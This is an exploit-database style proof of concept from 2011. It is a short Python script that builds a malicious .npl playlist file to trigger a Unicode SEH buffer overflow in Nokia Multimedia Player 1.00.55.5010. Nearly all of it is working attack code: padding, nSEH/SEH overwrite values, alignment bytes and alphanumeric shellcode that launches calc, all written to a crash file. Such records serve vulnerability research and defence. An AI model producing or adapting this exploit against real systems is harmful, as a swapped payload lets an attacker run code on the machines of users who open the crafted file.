# Exploit Title: Nokia Multimedia player  SEH Unicode
# Date: January 11 2011
# Author: Carlos Mario Penagos Hollmann
# Software Link: http://www.brothersoft.com/nokia-multimedia-player-download-46238.html
# Version: 1.00.55.5010
# Tested on: Windows xp sp3 running on VMware Fusion 3.1 and VirtualBox 3.2.8
 
  
#  mail----> shogilord^gmail.com spams are welcome!!!!!
#    ________  _    _________   ____ __ _____   ________
#   / ____/ / | |  / / ____/ | / / //_//  _/ | / / ____/
#  / __/ / /  | | / / __/ /  |/ / ,<   / //  |/ / / __
# / /___/ /___| |/ / /___/ /|  / /| |_/ // /|  / /_/ /
#/_____/_____/|___/_____/_/ |_/_/ |_/___/_/ |_/\____/ 
  
# COLOMBIA hacking presents.............
#    
# Dont be afraid of unicode my young padawan
#
# Big Thanks to sud0 !!
#
 
junk="\x44" * 2660
 
shellcode = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBdK8lPU4KjLS8o0mPO0LoQXc3QQPlpcdMa5YhnpVXgWRs920wkOXPA" #calc shellcode
 
nseh="\x61\xC5"
 
align = "\x61\x6D\x61\x6D\x50\x6E\xC3"
 
 
seh="\xEF\x42"
 
junk2="\xcc"*45
 
junk3="\xcc"*850
 
buff=junk+nseh+seh+align+junk2+shellcode+junk3
 
magic = open("Crash1234.npl","w")
 
magic.write(buff)
 
magic.close()



